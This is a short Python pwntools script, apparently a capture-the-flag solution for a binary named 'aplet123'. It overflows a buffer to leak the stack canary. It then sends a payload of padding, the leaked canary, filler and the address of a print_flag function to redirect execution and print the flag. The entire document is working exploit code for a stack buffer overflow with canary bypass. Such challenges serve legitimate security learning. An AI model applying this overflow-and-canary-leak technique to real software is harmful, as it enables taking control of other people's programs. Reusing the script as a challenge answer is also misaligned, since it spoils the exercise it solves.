from pwn import *

context.binary = binary = ELF('./aplet123', checksec=False)

win = p64(binary.symbols.print_flag)

p = process()

p.sendline(b'A' * 69 + b"i\'m")
p.recvuntil(b'hi ')
canary = b'\x00' + p.recv(7)
info(f'canary: {hex(u64(canary))}')

payload = b'bye\x00' + b'A' * 68 + canary + b'B' * 8 + win
p.sendline(payload)
p.recvuntil(b'bye\n')

print(p.recvline().decode().strip())
